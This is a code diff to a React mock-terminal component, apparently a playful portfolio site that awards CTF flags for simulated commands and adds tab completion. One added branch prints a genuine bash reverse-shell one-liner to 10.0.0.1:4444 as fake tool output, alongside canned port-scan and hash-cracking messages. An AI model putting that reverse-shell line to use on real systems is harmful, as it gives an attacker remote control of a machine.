@@ -270,6 +270,38 @@ const Terminal: React.FC = () => {
         addToHistory({ type: 'success', content: `You found the hidden file.\n\n🏴 CTF{h1dd3n_f1l3s_4r3_my_f4v}` });
         addToHistory({ type: 'output', content: `5/5 flags found. You're good at this. Hire me?` });
         break;
+      
+      case 'python':
+      case 'python3':
+        if (target?.includes('nmap_scanner.py') && currentDir === '~/tools') {
+          setIsProcessing(true);
+          addToHistory({ type: 'output', content: '[*] nmap_scanner.py — Custom port enumerator\n[*] Scanning 10.0.0.0/24...' });
+          setTimeout(() => {
+            addToHistory({ type: 'success', content: '🏴 CTF{py_sc4nn3r_g0_brr}' });
+            setIsProcessing(false);
+          }, 2000);
+        } else if (target?.includes('hash_cracker.py') && currentDir === '~/tools') {
+          setIsProcessing(true);
+          addToHistory({ type: 'output', content: '[*] Loading wordlist: rockyou.txt\n[*] Cracking...' });
+          setTimeout(() => {
+            addToHistory({ type: 'success', content: 'Hash cracked: 5f4dcc3b5aa765d61d8327deb882cf99 → "password"\n🏴 CTF{r0cky0u_w4s_t00_34sy}' });
+            setIsProcessing(false);
+          }, 2500);
+        }
+        break;
+
+      case 'bash':
+      case 'sh':
+        if (target?.includes('payload_gen.sh') && currentDir === '~/tools') {
+          setIsProcessing(true);
+          addToHistory({ type: 'output', content: '[*] Generating reverse shell payload...\n[*] LHOST: 10.0.0.1 LPORT: 4444' });
+          setTimeout(() => {
+            addToHistory({ type: 'output', content: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' });
+            addToHistory({ type: 'success', content: '🏴 CTF{p4yl04d_g3n_m4st3r}' });
+            setIsProcessing(false);
+          }, 1500);
+        }
+        break;
 
       default:
         addToHistory({ type: 'error', content: `Command not found: ${command}. Type 'help' for available commands.` });
@@ -298,6 +330,34 @@ const Terminal: React.FC = () => {
         setHistoryIndex(-1);
         setInput('');
       }
+    } else if (e.key === 'Tab') {
+      e.preventDefault();
+      if (!input.trim()) return;
+
+        const parts = input.split(' ');
+        const isCompletingCommand = parts.length === 1;
+        const partial = parts[parts.length - 1];
+
+        const commands = ['help','whoami','pwd','ls','cd','cat','ping','ssh','history','download','clear','nmap','sudo','exploit','flag','.secret'];
+
+        if (isCompletingCommand) {
+          const matches = commands.filter(c => c.startsWith(partial));
+          if (matches.length === 1) {
+            setInput(matches[0] + ' ');
+          } else if (matches.length > 1) {
+            addToHistory({ type: 'output', content: matches.join('  ') });
+          }
+        } else {
+          // complete files/dirs in current directory
+          const files = fileSystem[currentDir] ?? [];
+          const matches = files.filter(f => f.startsWith(partial));
+          if (matches.length === 1) {
+            parts[parts.length - 1] = matches[0].replace('/', '');
+            setInput(parts.join(' ') + ' ');
+          } else if (matches.length > 1) {
+            addToHistory({ type: 'output', content: matches.join('  ') });
+          }
+        }
     }
   };
 
